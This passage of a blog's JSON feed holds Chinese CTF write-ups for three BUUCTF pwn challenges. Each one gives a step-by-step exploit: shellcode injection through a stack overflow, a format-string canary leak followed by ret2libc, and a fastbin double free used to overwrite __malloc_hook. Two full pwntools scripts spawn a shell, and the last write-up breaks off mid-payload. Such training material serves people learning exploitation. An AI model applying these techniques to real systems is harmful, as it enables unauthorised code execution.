            "content_html": "<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/17/ymMrfyf3.png\" alt=\"\" /><br />\n发现没有开启 NX，有 rwx 段，可以利用 shellcode</p>\n<p>利用 ida 查看<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/17/5VybmqFr.png\" alt=\"\" /></p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/17/cG6l8WkS.png\" alt=\"\" /></p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/17/Aib7xfrT.png\" alt=\"\" /></p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/17/6xAZOCsq.png\" alt=\"\" /></p>\n<p>因为要写入 shellcode 并执行，所以我们需要利用栈溢出</p>\n<p>chall 函数里的 fget 因为大小限制为 1024（0x400），所以我们无法溢出，但是，该函数末尾有个 vuln（s，0x400），里面的 memcpy 函数会将 s，复制给 dest，且有 0x400 的大小可以进行溢出。</p>\n<p>我们需要绕过 <code>strcmp(s,crashme)</code> , 可以利用 <code>\\x00</code>  截断</p>\n<h1 id=\"2漏洞利用\"><a class=\"anchor\" href=\"#2漏洞利用\">#</a> 2. 漏洞利用</h1>\n<p>我们通过执行 shellcode 来 getshell，通过 <code>vuln</code>  函数中的 <code>memcpy函数</code> 进行复制来导致溢出，让我们返回到 <code>shellcode</code>  的地址，去执行</p>\n<p>由于分配的栈每次都是随机分配的，所以地址是变化的，导致我们需要的 <code>shellcode</code>  地址也是变动的</p>\n<p>偏移量是定值，在 <code>chall</code>  函数中首先会给一个 <code>s</code>  的地址， <code>s</code>  也在栈上（但是在不同的函数栈上），我们可以用得到的 s，加上调试找到的 <code>shellcode</code>  地址算出偏移量，利用固定的偏移量来计算后面的 <code>shellcode</code>  地址</p>\n<p>字符串 s 的地址高地址，要输入的 shellcode 地址为低地址<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4aBHf.png\" alt=\"\" /></p>\n<p><code>offset=0xfffdc7ac-0xfffdc790=0x1c=28</code></p>\n<p>其余只需要用 <code>\\x00</code>  绕过 <code>strcpy()</code>  函数即可</p>\n<p>【注意】</p>\n<p>该题的 <code>dest</code>  栈的偏移在 ida 中有偏差，我们进行手动调试</p>\n<pre><code class=\"language-pyhton\">from pwn import *\np=process('./ez_pz_hackover_2016')\ncontext.log_level='debug'\n \ngdb.attach(p)  ## 会在此处再打开一个终端\n# 'b *0x8048600'  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车\n，\np.recvuntil('crash: ')\nstack=int(p.recv(10),16)#接收s在栈上的地址\n\npayload='crashme\\x00'+'aaaaaa'#crashme\\x00绕过if判断      \n\npause()  #必须要在发送的payload前面，不然直接发送结束无法查询了\np.sendline(payload)\n \npause()  #必要的，不能少\n</code></pre>\n<p>调试步骤见文章 <code>gdb本地调试</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/18/pP4d6Z6.png\" alt=\"\" /></p>\n<p>从上图中看到 ebp 地址为 <code>0xfffdc788</code> ,esp <code>0xfffdc750</code> , 相对偏移为 0x38（ebp-esp），我们输入的内容从偏移 0x22 开始（小端序倒着读），从这可以看到我们需要填充的 <code>padding</code>  大小为 0x16+4（0x38-0x22+4）从未输入 crashme 开始算</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"crashme\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>stack_add<span class=\"token operator\">+</span>shellcode <span class=\"token comment\">#减 8 为前面的 \"crashme\\x00\" 的长度 (\\x00 为 1)</span></pre></td></tr></table></figure><h1 id=\"3-exp\"><a class=\"anchor\" href=\"#3-exp\">#</a> 3. exp</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ez_pz_hackover_2016'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b *0x8048600\")</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"lets crash: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>stack<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">0x1c</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"crashme\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>stack<span class=\"token operator\">-</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>shellcode </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>打通本地<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4w5hF.md.png\" alt=\"\" /></p>\n<p>得到 flag<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4wvtO.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_babyrop2/",
            "url": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_babyrop2/",
            "title": "bjdctf_2020_babyrop2（格式化字符串漏洞）",
            "date_published": "2023-09-12T13:08:15.000Z",
            "content_html": "<h1 id=\"bjdctf_2020_babyrop2\"><a class=\"anchor\" href=\"#bjdctf_2020_babyrop2\">#</a> bjdctf_2020_babyrop2</h1>\n<h2 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h2>\n<p>题目开启了 canary，不能随意进行栈溢出<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7AOA.png\" alt=\"\" /></p>\n<p>ida 反汇编查看</p>\n<p>mian（）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7Gmn.png\" alt=\"\" /><br />\n看到有三个函数</p>\n<p>init（）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7Jwq.png\" alt=\"\" /><br />\n输出字符串</p>\n<p>gift（）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7UYT.png\" alt=\"\" /><br />\n看到有个 <code>printf()</code> ，加上 <code>canary</code>  联想到 <code>格式化字符串漏洞</code> ，用来泄露 canary 的值，然后再进行栈溢出</p>\n<p>vuln（）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7afU.png\" alt=\"\" /><br />\n看到 <code>read()</code>  可以进行溢出</p>\n<h2 id=\"2查看canary的值\"><a class=\"anchor\" href=\"#2查看canary的值\">#</a> 2. 查看 canary 的值</h2>\n<p>输入点参数在栈上的相对位置（找偏移量），之前我都是输入 aaa %08x %08x……%08x 这样的字符串去找偏移的，这次不可以（限定了 6 个宽度的的输入），换了一种方法，输入 <code>%n$p</code> ,n 是偏移量，配上 <code>%$p</code>  就能定位到偏移量处，输出该位置上的内容</p>\n<p>此处一个一个试发现偏移是 6 (相对我们输入数据的位置)，输入值： <code>aa%6$p</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/21/pPIX16U.md.png\" alt=\"\" /><br />\n通过我们输入的值在栈上的位置往后查找，发现下一个位置有奇怪的一串数字，认定它为 <code>canary</code>  的值（要在栈上），而且它在 rbp 的上面<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPIXafx.png\" alt=\"\" /></p>\n<p>接着确定一下 <code>vuln()</code>  函数中 <code>canary</code>  位置，发现 rbp 位置与上面相同， <code>canary</code>  也在上面，也能通过 <code>rsp</code>  后面的 626262（bbb）, 确定我们的输入位置<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/22/pPoYYb6.png\" alt=\"\" /></p>\n<p>发现 <code>canary</code>  是距离我们输入位置 <code>0x18</code>  处，绕过 <code>canary</code>  后可以进行构造 <code>ret2libc</code></p>\n<p><s>如果相对栈起始偏移不变，那么我们输入的值也不是在栈的起始位置，，并不是，因为我们输入的值是在起始处，只是利用了格式化字符串......(此处为为我没想明白的地方：为什么我们输入的格式化字符串的值是在栈上有偏移的，而后面的栈溢出却是从栈顶开始的)</s></p>\n<h2 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./bjdctf_2020_babyrop2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bjdctf_2020_babyrop2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',25714)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>read_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>printf_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"printf\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x400993</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>vuln<span class=\"token operator\">=</span><span class=\"token number\">0x0400887</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"help u!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%7$p\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"%7$p\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>stroy<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"story!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stroy<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#p.recvuntil(\"help u!\\n\")</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"story!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">,</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#payload2=p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stroy<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/22/pPoUXi8.png\" alt=\"\" /></p>\n<p>【注意】<br />\n远程查找 libc 库无法打通本地（和靶机查找出来的不同）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/22/pPoUoMd.png\" alt=\"\" /></p>\n<p>靶机：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/22/pPoULIf.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/babyheap_0ctf_2017/",
            "url": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/babyheap_0ctf_2017/",
            "title": "babyheap_0ctf_2017，fastbin.attack之double.free",
            "date_published": "2023-09-12T13:08:15.000Z",
            "content_html": "<p>由于断断续续写了好久加上自身水平不足导致可能存在逻辑上的错误等等，如有错误，还望指出</p>\n<p><s>先前的理解<br />\n改变 index4 的大小后被认为是释放了，然后分配 fastbin (小于 0x80 的在这里) 根据后进先出，分配被认为是释放的 index4 为 index2，在将 index 的大小改回去，此时便让两个 index2 和 index4 都指向了同一个 chunk</s></p>\n<p><s>通过堆溢出，用还未释放的 index0 来溢出改变 chunk2 的 fd 的地址为 chunk4<br />\n，原来应该通过释放由于后进先出通过 free1，free2 的顺序，fastbin 中是由 chunk2-&gt;chunk1, 溢出后变为 chunk2-&gt;chunk4，此时视为 chunk4 被释放放在 fastbin 中，因为需要让两个 index 指向同一个 chunk，就需要在重新申请堆块 chunk1 和 chunkl2 后再申请 chunk4，由于再 fastbin 中，是后进先出（在 fastbin 中：chunk2-&gt;chunk4）所以给 index1 分配的是原来的 chunk2，而 index2 就被分配了 chunk4，</s></p>\n<p><s>后面 mallco (0x80) 仍然分配的是 chunk4（我认为应该是原本就是指向 chunk4，且已经修改了大小，所以申请时能够通过 “chunksuize 与其对应的 fastbin_index 匹配” 这是一个节省资源的机制，给相同大小的直接分配，不用去再合并块等等），这时 index2 与 index4 都指向了 chuink4，再次释放 free4，chunk4 就进入 unsortbin（unsortedbin 中只有一个块时，就会使 fd 和 bk 指针指向同一个地址，即  <code>main_arena+88, main_arena相对libc固定偏移0x3c4b20,不同libc版本偏移不同</code> ，因此  <code>libc=main_area_88-88-0x3c4b20</code> ）</s></p>\n<p>最终利用：<br />\n<strong>malloc_hook 是一个 libc 上的函数，如果指针不为空则会执行其指针指向的函数，通过这个来 getshell</strong></p>\n<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2uqmV.png\" alt=\"\" /></p>\n<p>发现保护全开了，利用 ida 查看一下</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2uvY4.png\" alt=\"\" /></p>\n<p>挨个查看</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2K961.png\" alt=\"\" /></p>\n<p>switch 里的判断条件（用来选择）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2KKXt.png\" alt=\"\" /></p>\n<p>case 1（allocate，分配 chunk）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2KUcn.png\" alt=\"\" /></p>\n<p>case 2（fill，进行内容填充，存在堆溢出）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MED0.png\" alt=\"\" /></p>\n<p>case 3（free，释放 chunk）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MM8J.png\" alt=\"\" /></p>\n<p>case 4（dump，输出内容，可以以此获取 main.arena88）：</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/12/pP2MN5D.png\" alt=\"\" /></p>\n<h1 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h1>\n<p>1. 由于 unsorted bin 中只有一个块时会将 fb 和 bk 指针指向 main.arena+88 处，而 libc 距 main.aerna-offset（该 offset 是一个固定值，只是不同版本的 libc 里不同）</p>\n<p><code>libc_base=main_arena_88-offset-88</code></p>\n<p>2. 因此我们要使一块 chunk 去到 unsorted bin 再用 dump 泄露出来，这就需要我们让两个 index 来指向同一个 chunk，一个释放掉使 chunk 到 unsorted bin，另一个就可以通过 dump 来泄露 main.arena+88 的地址</p>\n<ol start=\"3\">\n<li></li>\n</ol>\n<p>要让两个 index 指向同一个 chunk，就需要借助 free 来实现，通过 <strong>free 两个 index (chunk1,chunk2)</strong> ，使其到 fastbin 中，其会按照后进先出原则，再通过溢出<strong>使一个 index2 的 fd 指向 chunk4</strong>，将原来的 fastbin 中<strong> chunk2-&gt;chunk1 变换为了 chunk2-&gt;chunk4</strong>，此时 mallco （index1 的大小）时会将 chunk2 分配给 index1，而 mallco （index2 的大小）会将 chunk4 分配给 index2【注意此时要修改 chunk4 的 size 和 index2 的大小一致】，然后通过溢出 index3 将 chunk4 的 size 值恢复，然后再 mallco （index4 的大小）再释放，这时 chunk4 就会进入 unsorted bin , 并且 index2 也指向了 chunk4，可以通过 dump（index2）来泄露 main.arena+88 的地址</p>\n<p>4.fastbin attack</p>\n<p>原理：</p>\n<p>通过 double free 利用 ：释放 chunk1 和 chunk2 然后 fastbin 里就会形成   <code>fd指向的是下一个chunk的pre_size位</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP22dJO.png\" alt=\"\" /></p>\n<p>利用 double free 来再次释放 chunk1，会变成：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2fPJK.png\" alt=\"\" /></p>\n<p>此时申请后分配 chunk1：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2fNoq.png\" alt=\"\" /></p>\n<p>接着需要写入前面分配的 chunk1 来改变 fd 指向到想要写入的地址（此处是因为 free 了两次所以同一个 chunk1 一个再 heap 中，另一个在 fastbin 里，通过 heap 写入就能改写 fastbin 里的 fd 指向）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2IUuF.png\" alt=\"\" /></p>\n<p>接着 mallco chunk2 和 mallco chunk1，此时 fastbin 指向新指向的 chunk3</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pP2IqKS.png\" alt=\"\" /></p>\n<p>此时再 mallco 一次即可申请到新的 chunk3，然后就可以进行改写内容</p>\n<p>回到题目：</p>\n<p>通过泄露的地址来获得 libc 的基地址， <strong>libc 上的函数 libc_mallco，该函数会调用 mallco hook，是 libc 上的一个函数指针，若该指针不为空则执行它指向的函数</strong> ，我们可以以此来 getshell，用 fastbin attack 将一个 libc 上的地址放入 fastbin 链表中，然后通过 malloc （），将该地址分配，这样就可以改写 libc 的内容，通过 mallco hook 来 getshell（写入地址后再次 mallco 即可执行 mallco hook）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9JelVrVg==\">http://t.csdn.cn/IzUkV</span></p>\n<p>此时 chunk4 在 unsorted bin 中，我们需要 mallco 0x60，再 free 使其放入到 fastbin 中，因为前面 index2 已经指向了 chunk4，所以通过 index2 写入要修改的地址即可，然后 mallco 2 次，一个是 chunk4，一个就是新的 chunk 为要修改的 mallco hook</p>\n<h1 id=\"3漏洞利用\"><a class=\"anchor\" href=\"#3漏洞利用\">#</a> 3. 漏洞利用</h1>\n<p>1. 先利用 allocate 得到 chunk</p>\n<pre><code>allocate(0x10)  index0\nallocate(0x10)  index1\nallocate(0x10)  index2\nallocate(0x10)  index3\nallocate(0x80)  index4\n</code></pre>\n<p>2. 利用 free，使后续的两个 index 可以指向同一个 chunk</p>\n<pre><code>free（1）\nfree（2）\n</code></pre>\n<p>【注意修改 glibc 版本】</p>\n<pre><code>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Downloads/buuctf/babyheap_0ctf_2017\n</code></pre>\n<p>查看此时的堆（glibc 2.26 版本以后会不一样），可以发现地址都是对齐的：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAMSP.png\" alt=\"\" /></p>\n<p>查看 bins，此时是 chunk2-&gt;chunk1：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAtFs.png\" alt=\"\" /></p>\n<p>查看该 heap 的内容，由下面的图也可以发现地址只有第一个字节不同，所以后面溢出修改一个字节为 0x80 就好：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRAck9.png\" alt=\"\" /></p>\n<h2 id=\"溢出\"><a class=\"anchor\" href=\"#溢出\">#</a> 溢出</h2>\n<p>利用 index0 来溢出改写 index2 的 fd（不用 index1 是因为 index1 也被释放），利用 index3 来改写 index4 的 size</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>填充index0的fd和bk（因为此处是作为存储数据来用，并不是存地址）</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload1<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span 